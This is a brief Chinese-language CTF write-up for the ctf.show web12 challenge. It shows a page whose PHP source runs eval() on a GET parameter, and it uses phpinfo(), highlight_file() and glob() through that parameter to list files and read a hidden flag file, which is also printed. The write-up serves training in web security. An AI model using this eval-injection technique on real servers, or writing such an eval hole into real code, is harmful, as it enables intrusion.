查看源码，得到提示有cmd参数

```html
 <h2>ctf.show_web12</h2>
    <h4>where is the flag?</h4>
    <!-- hit:?cmd= -->
```

尝试?cmd=phpinfo();  ，存在回显。

使用`highlight_file("index.php")`查看index.php的源码：

```
 <?php
        $cmd=$_GET['cmd'];
        eval($cmd);
?>
```

使用`glob()`函数查看文件目录。

```
Array ( [0] => 903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php [1] => index.php )
```

查看903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php源码，得到flag：

```
ctfshow{c3faf7dc-7368-4fd4-b2f9-b800d99da5d5}
```

